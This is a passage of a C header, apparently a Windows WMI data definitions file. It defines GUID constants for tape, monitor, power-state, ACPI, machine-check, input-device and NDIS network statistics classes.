#define WMI_TAPE_DRIVE_PARAMETERS_GUID {0xb9a8cfd5,0x8d72,0x47a4, {0xac,0x0e,0x28,0x4a,0x32,0x00,0xf4,0xfb}}
#define WMI_TAPE_MEDIA_PARAMETERS_GUID {0x8c2147a4,0xff29,0x4336, {0xb8,0xa4,0x22,0x7b,0x54,0xcc,0x09,0x66}}
#define WMI_TAPE_PROBLEM_DEVICE_ERROR_GUID {0x43ec6b13,0x10bb,0x4bf6, {0xb7,0x16,0x1c,0x1e,0x2f,0x10,0xbb,0x5f}}
#define WMI_TAPE_PROBLEM_IO_ERROR_GUID {0x58fd29f9,0xb516,0x40fd, {0x87,0x1a,0x7e,0xe7,0x6d,0x5b,0xb5,0x3e}}
#define WMI_TAPE_PROBLEM_WARNING_GUID {0xbc4dd36c,0xfa66,0x4080, {0x87,0xa0,0x0c,0x59,0x22,0xeb,0x78,0x87}}
#define WMI_TAPE_SYMBOLIC_NAME_GUID {0x3fb828f7,0xf119,0x4066, {0xb1,0xe6,0xdb,0x40,0x7c,0xe9,0xde,0x91}}
#define WmiMonitorAnalogVideoInputParamsGuid {0xa56dbcf9,0xc4f0,0x44a8, {0x9c,0x1b,0xbb,0x3b,0x3f,0x77,0x4b,0x4d}}
#define WmiMonitorBasicDisplayParamsGuid {0x9831b7e6,0x09ac,0x491f, {0x8d,0x07,0x3c,0x3d,0x64,0x9d,0x82,0x40}}
#define WmiMonitorBrightnessEventGuid {0x123c80d2,0x937f,0x4cfe, {0x80,0xf4,0xc4,0x0d,0x59,0x6e,0x48,0xb7}}
#define WmiMonitorBrightnessGuid {0xd43412ac,0x67f9,0x4fbb, {0xa0,0x81,0x17,0x52,0xa2,0xc3,0x3e,0x84}}
#define WmiMonitorBrightnessMethodsGuid {0x479b20b4,0x5559,0x46fe, {0xbe,0x97,0x7d,0x22,0x21,0x54,0x42,0x1f}}
#define WmiMonitorColorCharacteristicsGuid {0xea324793,0x51bb,0x486a, {0xaa,0x9d,0x0f,0x55,0x52,0x35,0x34,0x13}}
#define WmiMonitorColorXYZinCIEGuid {0x01faf041,0x842c,0x4230, {0xa3,0x1e,0x13,0x35,0x42,0x8c,0xd8,0xf0}}
#define WmiMonitorConnectionParamsGuid {0x2e2d2463,0xb537,0x4da7, {0x8e,0xee,0x51,0x30,0x6f,0x1f,0x48,0x2f}}
#define WmiMonitorDescriptorMethodsGuid {0x5341576e,0x75c4,0x4aeb, {0xa8,0x2b,0x87,0x3c,0xd3,0xc6,0xb3,0x84}}
#define WmiMonitorDigitalVideoInputParamsGuid {0x51565945,0x498a,0x4a77, {0xac,0xc6,0x15,0x1b,0xec,0xc8,0x05,0xca}}
#define WmiMonitorIDGuid {0x671a8285,0x4edb,0x4cae, {0x99,0xfe,0x69,0xa1,0x5c,0x48,0xc0,0xbc}}
#define WmiMonitorListedFrequencyRangesGuid {0xe86e9525,0x65b6,0x4b85, {0x95,0xc5,0x00,0xbe,0xac,0xc9,0x75,0xed}}
#define WmiMonitorListedSupportedSourceModesGuid {0x6dc76655,0x063c,0x4524, {0xa8,0x62,0xb8,0x41,0x0c,0x26,0x28,0x1b}}
#define WmiMonitorRawEEdidV1BlockGuid {0xfaee1471,0x5149,0x4a68, {0xac,0x2c,0xbf,0x96,0xec,0x09,0xf0,0x04}}
#define WmiMonitorSupportedDisplayFeaturesGuid {0x9fa9c28b,0x5e5c,0x4035, {0xa5,0xf8,0x67,0xd4,0x55,0x4f,0x8d,0x04}}

#if !(defined(MIDL_PASS))

DEFINE_GUID(FrequencyRangeDescriptor_GUID, 0xf4546078,0xf3b2,0x417e,0x94,0xcd,0x47,0xea,0x30,0x6c,0x57,0x51);
DEFINE_GUID(IdleAccountingEx_GUID, 0xd67abd39,0x81f8,0x4a5e,0x81,0x52,0x72,0xe3,0x1e,0xc9,0x12,0xee);
DEFINE_GUID(IdleAccounting_GUID, 0xe2a26f78,0xae07,0x4ee0,0xa3,0x0f,0xce,0x35,0x4f,0x5a,0x94,0xcd);
DEFINE_GUID(IdleStateAccountingEx_GUID, 0x3e0d7b2c,0x401b,0x480f,0x83,0x03,0xd0,0xc2,0x0e,0xa1,0xa7,0xd8);
DEFINE_GUID(IdleStateAccounting_GUID, 0x5280028a,0xc24f,0x43ec,0xb2,0x7d,0xa9,0x60,0xa7,0x0e,0x31,0x9a);
DEFINE_GUID(IdleStateBucketEx_GUID, 0xe53e0a7d,0x36f0,0x4a77,0x87,0x9e,0x9c,0x6b,0x5e,0x4a,0x85,0x54);
DEFINE_GUID(KernelIdleStateChange_GUID, 0x4838fe4f,0xf71c,0x4e51,0x9e,0xcc,0x84,0x30,0xa7,0xac,0x4c,0x6c);
DEFINE_GUID(KernelIdleState_GUID, 0x46bdcf4a,0xe076,0x4550,0x82,0xb2,0x9f,0x32,0xed,0xed,0x3e,0x7f);
DEFINE_GUID(KernelIdleStates_GUID, 0xba138e10,0xe250,0x4ad7,0x86,0x16,0xcf,0x1a,0x7a,0xd4,0x10,0xe7);
DEFINE_GUID(KernelPerfStateChange_GUID, 0xa5b32ddd,0x7f39,0x4abc,0xb8,0x92,0x90,0x0e,0x43,0xb5,0x9e,0xbb);
DEFINE_GUID(KernelPerfStateDomainChange_GUID, 0x995e6b7f,0xd653,0x497a,0xb9,0x78,0x36,0xa3,0x0c,0x29,0xbf,0x01);
DEFINE_GUID(KernelPerfState_GUID, 0x8c7980e1,0xf62b,0x419e,0xaa,0x82,0x27,0x6c,0x8d,0x06,0x4a,0x1f);
DEFINE_GUID(KernelPerfStates_GUID, 0x5708cc20,0x7d40,0x4bf4,0xb4,0xaa,0x2b,0x01,0x33,0x8d,0x01,0x26);
DEFINE_GUID(KernelThermalConstraintChange_GUID, 0xa852c2c8,0x1a4c,0x423b,0x8c,0x2c,0xf3,0x0d,0x82,0x93,0x1a,0x88);
DEFINE_GUID(KernelThermalPolicyChange_GUID, 0xaca5a8f7,0x96ca,0x4397,0xba,0xde,0x43,0xbe,0x2f,0x57,0x7d,0x51);
DEFINE_GUID(MSAcpiInfo_GUID, 0x5daf38ae,0xf6f8,0x4d90,0x81,0x99,0xeb,0xde,0x68,0x00,0xec,0x3b);
DEFINE_GUID(MSAcpi_ThermalZoneTemperature_GUID, 0xa1bc18c0,0xa7c8,0x11d1,0xbf,0x3c,0x00,0xa0,0xc9,0x06,0x29,0x10);
DEFINE_GUID(MSAgp_Information_GUID, 0x8c27fbed,0x1c7b,0x47e4,0xa6,0x49,0x0e,0x38,0x9d,0x3a,0xda,0x4f);
DEFINE_GUID(MSChangerParameters_GUID, 0x24eb52ac,0x7c77,0x438b,0xab,0x61,0xd0,0x24,0xda,0xb0,0xc0,0x3a);
DEFINE_GUID(MSChangerProblemDeviceError_GUID, 0x56b396a8,0x0b95,0x42fe,0xbb,0xce,0xd3,0x6f,0xda,0x90,0x4f,0x8e);
DEFINE_GUID(MSChangerProblemEvent_GUID, 0x45db06a5,0x20d5,0x4de3,0xa3,0x6c,0x3a,0xb9,0x74,0x60,0x0a,0x4c);
DEFINE_GUID(MSDeviceUI_FirmwareRevision_GUID, 0x4504b1d4,0xc5ee,0x4df6,0x95,0x1f,0x16,0x18,0x0e,0x3d,0xd8,0x15);
DEFINE_GUID(MSDiskDriver_Geometry_GUID, 0x25007f51,0x57c2,0x11d1,0xa5,0x28,0x00,0xa0,0xc9,0x06,0x29,0x10);
DEFINE_GUID(MSDiskDriver_PerformanceData_GUID, 0xbdd865d2,0xd7c1,0x11d0,0xa5,0x01,0x00,0xa0,0xc9,0x06,0x29,0x10);
DEFINE_GUID(MSDiskDriver_Performance_GUID, 0xbdd865d1,0xd7c1,0x11d0,0xa5,0x01,0x00,0xa0,0xc9,0x06,0x29,0x10);
DEFINE_GUID(MSIde_PortDeviceInfo_GUID, 0x53f5630f,0xb6bf,0x11d0,0x94,0xf2,0x00,0xa0,0xc9,0x1e,0xfb,0x8b);
DEFINE_GUID(MSKeyboard_ClassInformation_GUID, 0x4731f899,0x71cb,0x11d1,0xa5,0x2c,0x00,0xa0,0xc9,0x06,0x29,0x10);
DEFINE_GUID(MSKeyboard_ExtendedID_GUID, 0x6ac4e23d,0xa950,0x4518,0x8b,0x2b,0xaa,0x4d,0xcd,0x5f,0xe1,0x4a);
DEFINE_GUID(MSKeyboard_PortInformation_GUID, 0x4731f89a,0x71cb,0x11d1,0xa5,0x2c,0x00,0xa0,0xc9,0x06,0x29,0x10);
DEFINE_GUID(MSMCAEvent_BusError_GUID, 0x1ee17050,0x0039,0x40f7,0x9e,0xad,0x14,0xad,0x51,0x61,0x2c,0xb2);
DEFINE_GUID(MSMCAEvent_CPUError_GUID, 0x5ce27cde,0xd179,0x4c68,0x93,0x7f,0xa0,0x7b,0x8c,0xc2,0xea,0x39);
DEFINE_GUID(MSMCAEvent_Header_GUID, 0x6381c27f,0xc8fa,0x4da7,0x89,0x53,0xb8,0x68,0x33,0x73,0x6e,0x15);
DEFINE_GUID(MSMCAEvent_InvalidError_GUID, 0x477b769b,0x785c,0x48dd,0xa0,0x2e,0x57,0xe0,0x51,0xbe,0x7b,0x85);
DEFINE_GUID(MSMCAEvent_MemoryError_GUID, 0x433eea38,0xc1a7,0x48f1,0x88,0x4f,0xb6,0x87,0x5f,0x17,0x6c,0xc7);
DEFINE_GUID(MSMCAEvent_MemoryHierarchyError_GUID, 0xcede75a0,0xa77f,0x452b,0x8f,0x2f,0x54,0x1f,0x92,0x6d,0xb0,0xf9);
DEFINE_GUID(MSMCAEvent_MemoryPageRemoved_GUID, 0x84e9ddb6,0xe233,0x4dfc,0x98,0x8c,0x74,0x12,0xc8,0x75,0x4f,0xec);
DEFINE_GUID(MSMCAEvent_PCIBusError_GUID, 0xa14a5594,0x25de,0x410e,0x9b,0x92,0x80,0xf0,0x80,0x1a,0xec,0x07);
DEFINE_GUID(MSMCAEvent_PCIComponentError_GUID, 0x805caf4e,0x336c,0x4eb2,0x8c,0x0c,0x02,0xf3,0x51,0xcb,0xf1,0x3c);
DEFINE_GUID(MSMCAEvent_PlatformSpecificError_GUID, 0x2d2434aa,0xef83,0x4200,0xba,0x24,0xde,0x36,0x6c,0x41,0x5f,0x7b);
DEFINE_GUID(MSMCAEvent_SMBIOSError_GUID, 0x4184df1b,0xedfe,0x406b,0xb1,0x72,0x54,0xc9,0x1f,0xbd,0x9b,0xaf);
DEFINE_GUID(MSMCAEvent_SwitchToCMCPolling_GUID, 0x39c14290,0xf036,0x4999,0xb8,0xa1,0xb6,0xf8,0x71,0xfb,0x32,0x9e);
DEFINE_GUID(MSMCAEvent_SwitchToCPEPolling_GUID, 0xd5c870ce,0x4ed0,0x4fdc,0xbb,0x54,0x8b,0x45,0x2c,0x18,0x79,0x7e);
DEFINE_GUID(MSMCAEvent_SystemEventError_GUID, 0xbdba4b12,0x8d00,0x4570,0xb9,0xb2,0x3f,0xde,0xcf,0x1d,0x56,0x61);
DEFINE_GUID(MSMCAEvent_TLBError_GUID, 0xb161eeab,0xac03,0x4c2b,0xae,0x7a,0x5a,0x37,0x68,0xf7,0x0e,0x85);
DEFINE_GUID(MSMCAInfo_Entry_GUID, 0x9e77a308,0x6b82,0x4fc1,0xab,0x41,0x0a,0x55,0x86,0x7c,0x35,0xc2);
DEFINE_GUID(MSMCAInfo_RawCMCEvent_GUID, 0x2f1a8a9d,0x7988,0x457f,0xa1,0x7a,0x89,0x79,0xe8,0x20,0x43,0xc5);
DEFINE_GUID(MSMCAInfo_RawCorrectedPlatformEvent_GUID, 0x6b629d5e,0xe63c,0x48a3,0x9e,0xbb,0x97,0x42,0x27,0x07,0x52,0x65);
DEFINE_GUID(MSMCAInfo_RawMCAData_GUID, 0x23602a8a,0xdadd,0x462f,0x9a,0xe5,0x30,0xfa,0x2c,0x37,0xdd,0x5b);
DEFINE_GUID(MSMCAInfo_RawMCAEvent_GUID, 0x2f1a8a9f,0x7988,0x457f,0xa1,0x7a,0x89,0x79,0xe8,0x20,0x43,0xc5);
DEFINE_GUID(MSMouse_ClassInformation_GUID, 0x4731f89b,0x71cb,0x11d1,0xa5,0x2c,0x00,0xa0,0xc9,0x06,0x29,0x10);
DEFINE_GUID(MSMouse_PortInformation_GUID, 0x4731f89c,0x71cb,0x11d1,0xa5,0x2c,0x00,0xa0,0xc9,0x06,0x29,0x10);
DEFINE_GUID(MSNdis_80211_AddWEP_GUID, 0x4307bff0,0x2129,0x11d4,0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03);
DEFINE_GUID(MSNdis_80211_AuthenticationMode_GUID, 0x43920a24,0x2129,0x11d4,0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03);
DEFINE_GUID(MSNdis_80211_BSSIList_GUID, 0x69526f9a,0x2062,0x11d4,0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03);
DEFINE_GUID(MSNdis_80211_BaseServiceSetIdentifier_GUID, 0x2504b6c2,0x1fa5,0x11d4,0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03);
DEFINE_GUID(MSNdis_80211_BssIdListScan_GUID, 0x0d9e01e1,0xba70,0x11d4,0xb6,0x75,0x00,0x20,0x48,0x57,0x03,0x37);
DEFINE_GUID(MSNdis_80211_ConfigurationFH_GUID, 0x4a800b8c,0x2068,0x11d4,0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03);
DEFINE_GUID(MSNdis_80211_ConfigurationInfo_GUID, 0x220c16fc,0xb9a8,0x11d4,0xb6,0x75,0x00,0x20,0x48,0x57,0x03,0x37);
DEFINE_GUID(MSNdis_80211_Configuration_GUID, 0x4a4df982,0x2068,0x11d4,0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03);
DEFINE_GUID(MSNdis_80211_DataRates_GUID, 0x49db8722,0x2068,0x11d4,0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03);
DEFINE_GUID(MSNdis_80211_DesiredDataRates_GUID, 0x452ee08e,0x2536,0x11d4,0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03);
DEFINE_GUID(MSNdis_80211_Disassociate_GUID, 0x43671f40,0x2129,0x11d4,0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03);
DEFINE_GUID(MSNdis_80211_FragmentationThreshold_GUID, 0x69aaa7c4,0x2062,0x11d4,0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03);
DEFINE_GUID(MSNdis_80211_InfrastructureMode_GUID, 0x697d5a7e,0x2062,0x11d4,0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03);
DEFINE_GUID(MSNdis_80211_NetworkInfrastructure_GUID, 0x34e1fa48,0xb9b6,0x11d4,0xb6,0x75,0x00,0x20,0x48,0x57,0x03,0x37);
DEFINE_GUID(MSNdis_80211_NetworkTypeInUse_GUID, 0x857e2326,0x2041,0x11d4,0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03);
DEFINE_GUID(MSNdis_80211_NetworkType_GUID, 0xe779ab61,0xb9ab,0x11d4,0xb6,0x75,0x00,0x20,0x48,0x57,0x03,0x37);
DEFINE_GUID(MSNdis_80211_NetworkTypesSupported_GUID, 0x8531d6e6,0x2041,0x11d4,0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03);
DEFINE_GUID(MSNdis_80211_NumberOfAntennas_GUID, 0x01779336,0x2064,0x11d4,0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03);
DEFINE_GUID(MSNdis_80211_PowerMode_GUID, 0x85be837c,0x2041,0x11d4,0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03);
DEFINE_GUID(MSNdis_80211_PrivacyFilter_GUID, 0x6733c4e9,0x4792,0x11d4,0x97,0xf1,0x00,0xc0,0x4f,0x79,0xc4,0x03);
DEFINE_GUID(MSNdis_80211_RTSThreshold_GUID, 0x0134d07e,0x2064,0x11d4,0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03);
DEFINE_GUID(MSNdis_80211_ReceiveAntennaSelected_GUID, 0x01ac07a2,0x2064,0x11d4,0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03);
DEFINE_GUID(MSNdis_80211_ReceivedSignalStrengthEventTrigger_GUID, 0x155689b8,0x2053,0x11d4,0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03);
DEFINE_GUID(MSNdis_80211_ReceivedSignalStrength_GUID, 0x1507db16,0x2053,0x11d4,0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03);
DEFINE_GUID(MSNdis_80211_ReloadDefaults_GUID, 0x748b14e8,0x32ee,0x4425,0xb9,0x1b,0xc9,0x84,0x8c,0x58,0xb5,0x5a);
DEFINE_GUID(MSNdis_80211_RemoveWEP_GUID, 0x433c345c,0x2129,0x11d4,0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03);
DEFINE_GUID(MSNdis_80211_ServiceSetIdentifier_GUID, 0x7d2a90ea,0x2041,0x11d4,0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03);
DEFINE_GUID(MSNdis_80211_Statistics_GUID, 0x42bb73b0,0x2129,0x11d4,0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03);
DEFINE_GUID(MSNdis_80211_TransmitAntennaSelected_GUID, 0x01dbb74a,0x2064,0x11d4,0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03);
DEFINE_GUID(MSNdis_80211_TransmitPowerLevel_GUID, 0x11e6ba76,0x2053,0x11d4,0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03);
DEFINE_GUID(MSNdis_80211_WEPStatus_GUID, 0xb027a21f,0x3cfa,0x4125,0x80,0x0b,0x3f,0x7a,0x18,0xfd,0xdc,0xdc);
DEFINE_GUID(MSNdis_80211_WLanBssId_GUID, 0x6929e718,0x2062,0x11d4,0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03);
DEFINE_GUID(MSNdis_AtmHardwareCurrentAddress_GUID, 0x791ad1a1,0xe35c,0x11d0,0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_AtmMaxAal0PacketSize_GUID, 0x791ad1a5,0xe35c,0x11d0,0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_AtmMaxAal1PacketSize_GUID, 0x791ad1a6,0xe35c,0x11d0,0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_AtmMaxAal34PacketSize_GUID, 0x791ad1a7,0xe35c,0x11d0,0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_AtmMaxAal5PacketSize_GUID, 0x791ad191,0xe35c,0x11d0,0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_AtmMaxActiveVciBits_GUID, 0x791ad1a3,0xe35c,0x11d0,0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_AtmMaxActiveVcs_GUID, 0x791ad1a2,0xe35c,0x11d0,0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_AtmMaxActiveVpiBits_GUID, 0x791ad1a4,0xe35c,0x11d0,0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_AtmReceiveCellsDropped_GUID, 0x0a21480c,0xe35f,0x11d0,0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_AtmReceiveCellsOk_GUID, 0x0a21480a,0xe35f,0x11d0,0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_AtmSupportedAalTypes_GUID, 0x791ad1a0,0xe35c,0x11d0,0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_AtmSupportedServiceCategory_GUID, 0x791ad19f,0xe35c,0x11d0,0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_AtmSupportedVcRates_GUID, 0x791ad19e,0xe35c,0x11d0,0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_AtmTransmitCellsOk_GUID, 0x0a21480b,0xe35f,0x11d0,0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_CoDriverVersion_GUID, 0x791ad198,0xe35c,0x11d0,0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_CoHardwareStatus_GUID, 0x791ad192,0xe35c,0x11d0,0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_CoLinkSpeed_GUID, 0x791ad195,0xe35c,0x11d0,0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_CoMacOptions_GUID, 0x791ad19a,0xe35c,0x11d0,0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_CoMediaConnectStatus_GUID, 0x791ad19b,0xe35c,0x11d0,0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_CoMediaInUse_GUID, 0x791ad194,0xe35c,0x11d0,0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_CoMediaSupported_GUID, 0x791ad193,0xe35c,0x11d0,0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_CoMinimumLinkSpeed_GUID, 0x791ad19d,0xe35c,0x11d0,0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_CoReceivePduErrors_GUID, 0x0a214808,0xe35f,0x11d0,0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_CoReceivePdusNoBuffer_GUID, 0x0a214809,0xe35f,0x11d0,0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_CoReceivePdusOk_GUID, 0x0a214806,0xe35f,0x11d0,0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_CoTransmitPduErrors_GUID, 0x0a214807,0xe35f,0x11d0,0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_CoTransmitPdusOk_GUID, 0x0a214805,0xe35f,0x11d0,0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_CoVendorDescription_GUID, 0x791ad197,0xe35c,0x11d0,0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_CoVendorDriverVersion_GUID, 0x791ad19c,0xe35c,0x11d0,0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_CoVendorId_GUID, 0x791ad196,0xe35c,0x11d0,0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_CountedString_GUID, 0x146360a5,0x88dd,0x11dd,0x94,0xb8,0x00,0x1d,0x09,0x16,0x2b,0xc3);
DEFINE_GUID(MSNdis_CurrentLookahead_GUID, 0x5ec10361,0xa61a,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_CurrentPacketFilter_GUID, 0x5ec10360,0xa61a,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_DeviceWakeOnMagicPacketOnly_GUID, 0xa14f1c97,0x8839,0x4f8a,0x99,0x96,0xa2,0x89,0x96,0xeb,0xbf,0x1d);
DEFINE_GUID(MSNdis_DriverVersion_GUID, 0x5ec10362,0xa61a,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_EnumerateAdapterEx_GUID, 0x16716917,0x4306,0x4be4,0x9b,0x5a,0x38,0x09,0xae,0x44,0xb1,0x25);
DEFINE_GUID(MSNdis_EnumerateAdapter_GUID, 0x981f2d7f,0xb1f3,0x11d0,0x8d,0xd7,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_EnumeratePorts_GUID, 0xf1d6abe8,0x15e4,0x4407,0x81,0xb7,0x6b,0x83,0x0c,0x77,0x7c,0xd9);
DEFINE_GUID(MSNdis_EnumerateReceiveFilters_GUID, 0x3f2c141d,0x83bc,0x11dd,0x94,0xb8,0x00,0x1d,0x09,0x16,0x2b,0xc3);
DEFINE_GUID(MSNdis_EnumerateReceiveQueues_GUID, 0x3f2c141b,0x83bc,0x11dd,0x94,0xb8,0x00,0x1d,0x09,0x16,0x2b,0xc3);
DEFINE_GUID(MSNdis_EthernetCurrentAddress_GUID, 0x44795700,0xa61b,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_EthernetMacOptions_GUID, 0x44795703,0xa61b,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_EthernetMaximumMulticastListSize_GUID, 0x44795702,0xa61b,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_EthernetMoreTransmitCollisions_GUID, 0x44795706,0xa61b,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_EthernetMulticastList_GUID, 0x44795701,0xa61b,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_EthernetOneTransmitCollision_GUID, 0x44795705,0xa61b,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_EthernetPermanentAddress_GUID, 0x447956ff,0xa61b,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_EthernetReceiveErrorAlignment_GUID, 0x44795704,0xa61b,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_FddiAttachmentType_GUID, 0xacf1403d,0xa61c,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_FddiDownstreamNodeLong_GUID, 0xacf1403f,0xa61c,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_FddiFrameErrors_GUID, 0xacf14040,0xa61c,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_FddiFramesLost_GUID, 0xacf14041,0xa61c,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_FddiLConnectionState_GUID, 0xacf14045,0xa61c,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_FddiLctFailures_GUID, 0xacf14043,0xa61c,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_FddiLemRejects_GUID, 0xacf14044,0xa61c,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_FddiLongCurrentAddress_GUID, 0xacf14036,0xa61c,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_FddiLongMaximumListSize_GUID, 0xacf14038,0xa61c,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_FddiLongMulticastList_GUID, 0xacf14037,0xa61c,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_FddiLongPermanentAddress_GUID, 0xacf14035,0xa61c,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_FddiRingManagmentState_GUID, 0xacf14042,0xa61c,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_FddiShortCurrentAddress_GUID, 0xacf1403a,0xa61c,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_FddiShortMaximumListSize_GUID, 0xacf1403c,0xa61c,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_FddiShortMulticastList_GUID, 0xacf1403b,0xa61c,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_FddiShortPermanentAddress_GUID, 0xacf14039,0xa61c,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_FddiUpstreamNodeLong_GUID, 0xacf1403e,0xa61c,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
